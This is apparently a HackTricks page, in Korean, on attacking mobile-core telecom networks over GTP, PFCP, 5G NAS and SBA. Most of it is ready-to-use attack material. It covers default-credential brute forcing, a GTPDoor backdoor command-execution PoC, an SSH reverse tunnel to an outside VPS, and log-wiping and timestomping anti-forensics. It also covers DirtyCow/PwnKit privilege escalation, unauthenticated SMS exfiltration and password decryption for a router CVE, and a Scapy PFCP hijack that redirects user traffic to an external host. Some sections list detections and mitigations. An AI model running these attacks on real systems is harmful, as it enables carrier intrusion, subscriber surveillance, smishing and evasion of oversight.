# 텔레콤 네트워크 악용 (GTP / Roaming Environments)

{{#include ../../banners/hacktricks-training.md}}

> [!NOTE]
> Mobile-core protocols (GPRS Tunnelling Protocol – GTP)는 종종 반신뢰성 GRX/IPX 로밍 백본을 통해 전송됩니다. 평문 UDP에 거의 인증 없이 실려 있기 때문에, **통신망 경계 내부의 어떤 foothold라도 보통 코어 시그널링 평면에 직접 도달할 수 있습니다**. 다음 노트는 SGSN/GGSN, PGW/SGW 및 기타 EPC 노드에 대해 실전에서 관찰된 offensive tricks를 정리한 것입니다.

## 1. Recon & Initial Access

### 1.1  기본 OSS / NE 계정
놀랍게도 많은 벤더의 네트워크 장비가 `root:admin`, `dbadmin:dbadmin`, `cacti:cacti`, `ftpuser:ftpuser`, … 같은 하드코딩된 SSH/Telnet 사용자 계정으로 출하됩니다. 전용 wordlist는 brute-force 성공률을 극적으로 높입니다:
```bash
hydra -L usernames.txt -P vendor_telecom_defaults.txt ssh://10.10.10.10 -t 8 -o found.txt
```
장치가 management VRF만 노출하는 경우, 먼저 jump host를 통해 pivot하세요(아래 «SGSN Emu Tunnel» 섹션 참조).

### 1.2  GRX/IPX 내부의 Host Discovery
대부분의 GRX 운영자는 여전히 백본 전반에 걸쳐 **ICMP echo**를 허용합니다. `masscan`과 내장 `gtpv1` UDP probes를 결합하여 GTP-C listeners를 빠르게 매핑하세요:
```bash
masscan 10.0.0.0/8 -pU:2123 --rate 50000 --router-ip 10.0.0.254 --router-mac 00:11:22:33:44:55
```
## 2. 가입자 열거 – `cordscan`

다음 Go 도구는 **GTP-C Create PDP Context Request** 패킷을 생성하고 응답을 기록합니다. 각 응답은 조회된 IMSI를 서비스하는 현재 **SGSN / MME**와 때로는 가입자의 방문 PLMN을 보여줍니다.
```bash
# Build
GOOS=linux GOARCH=amd64 go build -o cordscan ./cmd/cordscan

# Usage (typical):
./cordscan --imsi 404995112345678 --oper 40499 -w out.pcap
```
주요 플래그:
- `--imsi` 대상 가입자 IMSI
- `--oper` 홈 / HNI (MCC+MNC)
- `-w`      원시 패킷을 pcap에 기록

바이너리 내부의 중요한 상수들은 스캔 범위를 넓히기 위해 패치할 수 있다:
```
pingtimeout       = 3   // seconds before giving up
pco               = 0x218080
common_tcp_ports  = "22,23,80,443,8080"
```
## 3. GTP를 통한 코드 실행 – `GTPDoor`

`GTPDoor`는 UDP 2123에 바인딩하고 들어오는 모든 GTP-C 패킷을 파싱하는 작은 ELF 서비스입니다. 페이로드가 사전 공유된 태그로 시작하면 나머지는 AES-128-CBC로 복호화되어 `/bin/sh -c`를 통해 실행됩니다. stdout/stderr는 **Echo Response** 메시지 안에 포함되어 전송되므로 외부 세션이 전혀 생성되지 않습니다.

최소 PoC 패킷 (Python):
```python
import gtpc, Crypto.Cipher.AES as AES
key = b"SixteenByteKey!"
cmd = b"id;uname -a"
enc = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).encrypt(cmd.ljust(32,b"\x00"))
print(gtpc.build_echo_req(tag=b"MAG1C", blob=enc))
```
Detection:
* SGSN IPs로 **unbalanced Echo Requests**를 보내는 모든 호스트
* GTP 버전 플래그가 1로 설정되어 있고 message type = 1 (Echo)인 경우 – 규격에서 벗어남

## 4. 코어 네트워크를 통한 Pivoting

### 4.1  `sgsnemu` + SOCKS5
`OsmoGGSN`은 SGSN 에뮬레이터를 포함하며, 이 에뮬레이터는 **establish a PDP context towards a real GGSN/PGW**. 협상 후, Linux는 로밍 피어에서 접근 가능한 새로운 `tun0` 인터페이스를 받는다.
```bash
sgsnemu -g 10.1.1.100 -i 10.1.1.10 -m 40499 -s 404995112345678 \
-APN internet -c 1 -d
ip route add 172.16.0.0/12 dev tun0
microsocks -p 1080 &   # internal SOCKS proxy
```
적절한 firewall hair-pinning을 통해, 이 터널은 signalling-only VLANs를 우회하여 직접 **data plane**에 진입합니다.

### 4.2  SSH Reverse Tunnel over Port 53
DNS는 로밍 인프라에서 거의 항상 열려 있습니다. 내부 SSH 서비스를 VPS에서 :53으로 리스닝하게 노출시키고, 나중에 집에서 접속하세요:
```bash
ssh -f -N -R 0.0.0.0:53:127.0.0.1:22 user@vps.example.com
```
VPS에서 `GatewayPorts yes`가 활성화되어 있는지 확인하세요.

## 5. 은닉 채널

| 채널 | 전송 | 디코딩 | 설명 |
|---------|-----------|----------|-------|
| ICMP – `EchoBackdoor` | ICMP Echo Req/Rep | 4-byte key + 14-byte chunks (XOR) | 완전 수동 리스너, 아웃바운드 트래픽 없음 |
| DNS – `NoDepDNS` | UDP 53 | XOR (key = `funnyAndHappy`) encoded in A-record octets | `*.nodep` 서브도메인 모니터링 |
| GTP – `GTPDoor` | UDP 2123 | AES-128-CBC blob in private IE | 정상 GTP-C 트래픽에 섞여 있음 |

All implants implement watchdogs that **timestomp** their binaries and re-spawn if crashed.

## 6. 방어 회피 치트시트
```bash
# Remove attacker IPs from wtmp
utmpdump /var/log/wtmp | sed '/203\.0\.113\.66/d' | utmpdump -r > /tmp/clean && mv /tmp/clean /var/log/wtmp

# Disable bash history
export HISTFILE=/dev/null

# Masquerade as kernel thread
echo 0 > /proc/$$/autogroup   # hide from top/htop
printf '\0' > /proc/$$/comm    # appears as [kworker/1]

touch -r /usr/bin/time /usr/bin/chargen   # timestomp
setenforce 0                              # disable SELinux
```
## 7. 구형 NE에서의 Privilege Escalation
```bash
# DirtyCow – CVE-2016-5195
gcc -pthread dirty.c -o dirty && ./dirty /etc/passwd

# PwnKit – CVE-2021-4034
python3 PwnKit.py

# Sudo Baron Samedit – CVE-2021-3156
python3 exploit_userspec.py
```
정리 팁:
```bash
userdel firefart 2>/dev/null
rm -f /tmp/sh ; history -c
```
## 8. 도구 상자

* `cordscan`, `GTPDoor`, `EchoBackdoor`, `NoDepDNS` – 이전 섹션에서 설명한 커스텀 툴링.
* `FScan` : 인트라넷 TCP 스윕 (`fscan -p 22,80,443 10.0.0.0/24`)
* `Responder` : LLMNR/NBT-NS rogue WPAD
* `Microsocks` + `ProxyChains` : 경량 SOCKS5 pivoting
* `FRP` (≥0.37) : NAT traversal / asset bridging

## 9. 5G NAS 등록 공격: SUCI leaks, EEA0/EIA0로의 다운그레이드, 그리고 NAS replay

5G 등록 절차는 NGAP 위의 NAS (Non-Access Stratum) 상에서 실행됩니다. Security Mode Command/Complete로 NAS 보안이 활성화되기 전까지 초기 메시지는 인증되지도 않고 암호화되지도 않습니다. 이 보안 전(前) 창은 N2 트래픽을 관찰하거나 변조할 수 있을 때(예: 코어 내부의 on-path, rogue gNB, 또는 테스트베드) 여러 공격 경로를 허용합니다.

Registration flow (간단히):
- Registration Request: UE가 SUCI (암호화된 SUPI) 및 capabilities를 전송합니다.
- Authentication: AMF/AUSF가 RAND/AUTN을 보내고; UE가 RES*를 반환합니다.
- Security Mode Command/Complete: NAS 무결성(integrity) 및 암호화(ciphering)가 협상되어 활성화됩니다.
- PDU Session Establishment: IP/QoS 설정.

실험실 설정 팁 (비-RF):
- Core: Open5GS 기본 배포로 흐름을 재현하기에 충분합니다.
- UE: 시뮬레이터나 테스트 UE; Wireshark로 디코드하세요.
- Active tooling: 5GReplay (capture/modify/replay NAS within NGAP), Sni5Gect (sniff/patch/inject NAS on the fly without bringing up a full rogue gNB).
- Wireshark에서 유용한 디스플레이 필터:
- ngap.procedure_code == 15 (InitialUEMessage)
- nas_5g.message_type == 65 or nas-5gs.message_type == 65 (Registration Request)

### 9.1 Identifier privacy: SUCI failures exposing SUPI/IMSI
예상 동작: UE/USIM은 SUCI(SUPI를 홈 네트워크 공개키로 암호화한 것)만 전송해야 합니다. Registration Request에서 평문 SUPI/IMSI가 발견되면 지속적인 가입자 추적이 가능한 프라이버시 결함을 의미합니다.

테스트 방법:
- InitialUEMessage의 첫 NAS 메시지를 캡처하고 Mobile Identity IE를 검사하세요.
- Wireshark 빠른 확인:
- SUCI로 디코드되어야 하며, IMSI로 디코드되어서는 안 됩니다.
- 필터 예시: `nas-5gs.mobile_identity.suci || nas_5g.mobile_identity.suci` 존재 여부를 확인하세요; 부재하면서 `imsi`가 존재하면 leak를 의미합니다.

수집 항목:
- 노출된 경우 MCC/MNC/MSIN; UE별로 로그를 남기고 시간/위치에 따라 추적하세요.

완화:
- SUCI 전용 UE/USIM 강제화; 초기 NAS에서 어떤 IMSI/SUPI라도 감지되면 경보.

### 9.2 Capability bidding-down to null algorithms (EEA0/EIA0)
배경:
- UE는 Registration Request의 UE Security Capability IE에서 지원하는 EEA(암호화) 및 EIA(무결성)를 광고합니다.
- 일반 매핑: EEA1/EIA1 = SNOW3G, EEA2/EIA2 = AES, EEA3/EIA3 = ZUC; EEA0/EIA0는 null 알고리즘입니다.

문제:
- Registration Request는 무결성 보호가 되지 않기 때문에, on-path 공격자는 capability 비트를 지워서 이후 Security Mode Command 중에 EEA0/EIA0 선택을 강제할 수 있습니다. 일부 스택은 비상 서비스 외부에서도 null 알고리즘을 잘못 허용합니다.

공격 단계:
- InitialUEMessage를 가로채어 NAS UE Security Capability를 오직 EEA0/EIA0만 광고하도록 수정합니다.
- Sni5Gect를 사용해 NAS 메시지에 훅을 걸고 전달하기 전에 capability 비트를 패치합니다.
- AMF가 null cipher/무결성을 수용하고 Security Mode를 EEA0/EIA0로 완료하는지 관찰합니다.

검증/가시성:
- Wireshark에서 Security Mode Command/Complete 이후 선택된 알고리즘을 확인하세요.
- 예시 패시브 스니퍼 출력:
```
Encyrption in use [EEA0]
Integrity in use [EIA0, EIA1, EIA2]
SUPI (MCC+MNC+MSIN) 9997000000001
```
Mitigations (must):
- AMF/policy를 구성하여 EEA0/EIA0을 엄격히 요구되는 경우(예: 긴급 통화)를 제외하고 거부하도록 설정.
- 최소한 EEA2/EIA2 적용을 권장; null algorithms을 협상하는 모든 NAS 보안 컨텍스트에 대해 로깅 및 경보를 생성.

### 9.3 Replay of initial Registration Request (pre-security NAS)
초기 NAS는 무결성과 신선도가 부족하므로 캡처된 InitialUEMessage+Registration Request를 AMF로 재전송(replay)할 수 있다.

PoC rule for 5GReplay to forward matching replays:
```xml
<beginning>
<property value="THEN"
property_id="101"
type_property="FORWARD"
description="Forward InitialUEMessage with Registration Request">

<!-- Trigger on NGAP InitialUEMessage (procedureCode == 15) -->
<event value="COMPUTE"
event_id="1"
description="Trigger: InitialUEMessage"
boolean_expression="ngap.procedure_code == 15"/>

<!-- Context match on NAS Registration Request (message_type == 65) -->
<event value="COMPUTE"
event_id="2"
description="Context: Registration Request"
boolean_expression="nas_5g.message_type == 65"/>

</property>
</beginning>
```
관찰할 항목:
- AMF가 리플레이를 수락하고 Authentication으로 진행하는지 여부; 신선도/컨텍스트 검증 부재는 노출을 의미함.

완화책:
- AMF에서 리플레이 보호/컨텍스트 바인딩을 적용; GNB/UE 단위로 rate-limit 및 상관관계 설정.

### 9.4 Tooling pointers (reproducible)
- Open5GS: AMF/SMF/UPF를 띄워 코어를 에뮬레이트; N2 (NGAP) 및 NAS를 관찰.
- Wireshark: NGAP/NAS 디코드 확인; 위 필터를 적용해 Registration을 분리.
- 5GReplay: registration을 캡처한 후 규칙에 따라 특정 NGAP + NAS 메시지를 재생(replay).
- Sni5Gect: NAS 제어 평면을 실시간으로 sniff/modify/inject 하여 null 알고리즘을 강제하거나 인증 시퀀스를 교란.

### 9.5 Defensive checklist
- Registration Request에서 평문 SUPI/IMSI를 지속적으로 검사; 문제가 있는 장치/USIM을 차단.
- EEA0/EIA0는 엄격히 제한된 긴급 절차를 제외하고 거부; 최소 EEA2/EIA2 필요.
- 무단 또는 잘못 구성된 인프라 탐지: 허가되지 않은 gNB/AMF, 예상치 못한 N2 피어.
- null 알고리즘을 초래하거나 InitialUEMessage의 잦은 재생(replay)을 유발하는 NAS 보안 모드에 대해 경보.

---

## 10. 산업용 셀룰러 라우터 – 인증 없는 SMS API 남용 (Milesight UR5X/UR32/UR35/UR41) 및 자격 증명 복구 (CVE-2023-43261)

산업용 셀룰러 라우터의 노출된 웹 API를 악용하면 은밀하게 통신사 발신 smishing을 대규모로 수행할 수 있다. Milesight UR-series 라우터는 `/cgi`에 JSON-RPC 스타일 엔드포인트를 노출한다. 잘못 구성된 경우, API는 인증 없이 SMS 수신함/발신함을 나열하기 위해 쿼리될 수 있으며 일부 배포에서는 SMS 전송도 가능하다.

일반적인 인증 없는 요청(수신함/발신함 모두 동일한 구조):
```http
POST /cgi HTTP/1.1
Host: <router>
Content-Type: application/json

{ "base": "query_outbox", "function": "query_outbox", "values": [ {"page":1,"per_page":50} ] }
```

```json
{ "base": "query_inbox", "function": "query_inbox", "values": [ {"page":1,"per_page":50} ] }
```
응답에는 `timestamp`, `content`, `phone_number` (E.164), `status` (`success` or `failed`) 등의 필드가 포함됩니다. 같은 번호로의 반복된 `failed` 전송은 종종 공격자가 'capability checks'를 수행하여 라우터/SIM이 대량 전송(blasting)을 수행할 수 있는지 검증하는 것입니다.

SMS metadata를 exfiltrate하기 위한 예시 curl:
```bash
curl -sk -X POST http://<router>/cgi \
-H 'Content-Type: application/json' \
-d '{"base":"query_outbox","function":"query_outbox","values":[{"page":1,"per_page":100}]}'
```
auth artifacts 관련 메모:
- 일부 트래픽에는 auth cookie가 포함될 수 있지만, management interface가 Internet-facing일 때 많은 노출된 장치들은 인증 없이 `query_inbox`/`query_outbox`에 응답합니다.
- auth를 요구하는 환경에서는 previously-leaked credentials(아래 참조)를 통해 접근이 복원됩니다.

자격 증명 복구 경로 – CVE-2023-43261:
- 영향 대상 제품군: UR5X, UR32L, UR32, UR35, UR41 (pre v35.3.0.7).
- 문제: 웹으로 제공되는 로그(예: `httpd.log`)가 `/lang/log/`에서 인증 없이 접근 가능하며 admin 로그인 이벤트가 포함되어 있고, 비밀번호는 client-side JavaScript에 하드코딩된 AES key/IV로 암호화되어 있습니다.
- 실제 접근 및 복호화:
```bash
curl -sk http://<router>/lang/log/httpd.log | sed -n '1,200p'
# Look for entries like: {"username":"admin","password":"<base64>"}
```
leaked 비밀번호를 복호화하기 위한 최소한의 Python (AES-128-CBC, 하드코딩된 key/IV):
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
KEY=b'1111111111111111'; IV=b'2222222222222222'
enc_b64='...'  # value from httpd.log
print(unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(enc_b64)), AES.block_size).decode())
```
Hunting and detection ideas (network):
- 인증되지 않은 `POST /cgi`에서 JSON 본문이 `base`/`function`을 `query_inbox` 또는 `query_outbox`로 설정한 경우 경보.
- 동일 출발지 IP에서 여러 고유 번호에 걸쳐 `status":"failed"` 항목이 뒤따르는 반복적인 `POST /cgi` 폭주를 추적(기능 테스트).
- 인터넷에 노출된 Milesight 라우터를 인벤토리화; 관리 접근을 VPN으로 제한; 필요하지 않으면 SMS 기능 비활성화; v35.3.0.7 이상으로 업그레이드; 자격증명 교체 및 알 수 없는 발신에 대한 SMS 로그 검토.

Shodan/OSINT pivots (현장에서 관찰된 예):
- `http.html:"rt_title"`는 Milesight 라우터 패널과 일치.
- Google dorking으로 노출된 로그 검색: `"/lang/log/system" ext:log`.

운영 영향: 라우터 내부에 합법적인 통신사 SIM을 사용하면 phishing에 대한 SMS 전달력/신뢰도가 매우 높아지며, inbox/outbox 노출은 민감한 메타데이터를 대규모로 leaks한다.

---

## 11. PFCP Session Hijack & GTP-U TEID Abuse

### 11.1 PFCP Session Modification to steal flows
If you can speak PFCP on N4 (e.g., from a mis-filtered GRX/IPX segment), craft a **Session Modification Request** that inserts a duplicate PDR ID but with a *smaller* Precedence and a FAR pointing to your host. Some UPFs (e.g., OAI-cn5g) apply the first matching PDR and never check for uniqueness, so the malicious PDR hijacks all subsequent packets of that PDU session to your sink.

Minimal Scapy PoC (assumes PFCP contrib is available and you know SEID/PDR IDs):

<details>
<summary>Scapy PFCP session hijack PoC</summary>
```python
from scapy.all import *
from scapy.contrib.pfcp import *

n4 = "10.10.20.5"   # UPF N4
seid = 0x123456789abc
pdr_id = 7           # existing PDR ID in session
far_id = 77          # new malicious FAR

pkt = IP(dst=n4)/UDP(sport=8805,dport=8805)/PFCP(
S=1, seid=seid, msg_type=MODIFICATION_REQUEST)/PFCPSessionModificationRequest(
IE_list=[PDR(id=pdr_id, precedence=1, outer_header_removal=0,
far_id=fid_identifier(far_id)),
FAR(id=far_id, apply_action=0b10,  # FORWARD
forwarding_parameters=ForwardingParameters(
outer_header_creation=OuterHeaderCreation(
desc=0x0002, ipv4_address="203.0.113.55", teid=0xdeadbeef)))] )
send(pkt, verbose=False)
```
</details>

### 11.2 TEIDs를 스푸핑하여 사용자 트래픽 주입
백본에서 오는 uplink GTP-U에 ACL’d가 설정되어 있지 않으면, GTP-U 헤더에서 관찰된 **TEIDs**를 재생/추측하여 UE의 피어나 Internet 쪽으로 임의의 IP/TCP를 캡슐화해 보낼 수 있습니다. 예시 패킷:
```python
send(IP(dst="10.10.20.8")/UDP(dport=2152,sport=2152)/
GTP_U_Header(teid=0x7ffed00)/
IP(src="10.0.0.10",dst="1.1.1.1")/TCP(dport=443,flags="S"))
```
Pair this with passive sniffing on N3/N6 to learn active TEIDs; many PGW/UPF stacks accept any uplink source once TEID matches.

---

## 12. SBA/SBI Fuzzing & Cross-Service Token Attack (free5GC R17)
FivGeeFuzz (academic 2025) auto-derives grammars from 3GPP OpenAPI specs to fuzz HTTP-based SBIs. Against free5GC it uncovered eight bugs including the **Cross-Service Token** abuse: a compromised NF obtains an access token for Service A and reuses it against Service B because audience/issuer checks were missing in the target NF.

Quick replay idea (assuming you stole an NRF-issued token from any NF):
```bash
# Swap :authority to the victim NF and reuse the bearer token
curl -sk -H "Authorization: Bearer $TOKEN" \
-H "Host: smf.internal" \
https://smf.internal/nsmf-pdusession/v1/sm-contexts
```
FivGeeFuzz grammars로 자동으로 fuzz하려면:
```bash
python3 fivgeefuzz.py --nf nsmf-pdusession \
--target https://smf.internal \
--grammar grammars/nsmf-pdusession.json \
--token "$TOKEN" --threads 8 --max-cases 500
```
SMF/AMF pods에서 401/403 우회 및 크래시를 주시하세요; 패치된 free5GC 빌드는 불일치하는 `aud`/`iss`를 거부합니다.

---

## 탐지 아이디어
1. **SGSN/GGSN이 아닌 어떤 장치가 Create PDP Context Requests를 설정하는 경우**.
2. **내부 IP에서 비표준 포트 (53, 80, 443)로 SSH 핸드셰이크를 수신하는 경우**.
3. **응답이 없는 잦은 Echo Requests** – GTPDoor 비콘을 나타낼 수 있음.
4. **큰, 0이 아닌 identifier/sequence 필드를 가진 ICMP echo-reply 트래픽의 높은 비율**.
5. 5G: **동일한 엔드포인트에서 반복되는 NAS Registration Requests를 포함한 InitialUEMessage** (리플레이 신호).
6. 5G: **긴급 상황이 아닌 맥락에서 NAS Security Mode가 EEA0/EIA0를 협상하는 경우**.
7. PFCP: **중복 PDR ID를 포함하거나 갑작스런 FAR의 오프넷 IP로의 리다이렉션을 동반하는 Session Modification**.
8. SBA: **NRF가 호출된 NF와 일치하지 않는 `aud`를 가진 토큰을 발행하는 경우** – Cross-Service Token 리플레이를 시사.

## References

- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- 3GPP TS 29.060 – GPRS Tunnelling Protocol (v16.4.0)
- 3GPP TS 29.281 – GTPv2-C (v17.6.0)
- [Demystifying 5G Security: Understanding the Registration Protocol](https://bishopfox.com/blog/demystifying-5g-security-understanding-the-registration-protocol)
- 3GPP TS 24.501 – Non-Access-Stratum (NAS) protocol for 5GS
- 3GPP TS 33.501 – Security architecture and procedures for 5G System
- [Silent Smishing: The Hidden Abuse of Cellular Router APIs (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [CVE-2023-43261 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-43261)
- [CVE-2023-43261 PoC (win3zz)](https://github.com/win3zz/CVE-2023-43261)
- [Cross-Service Token in 5G Core (API Security Blog)](https://api-security.blog/2025/09/12/cross-service-token-finding-attacks-in-5g-core-networks/)
- [PFCP Session Modification Hijack in OAI UPF](https://gitlab.eurecom.fr/oai/cn5g/oai-cn5g-upf/-/issues/33)

{{#include ../../banners/hacktricks-training.md}}
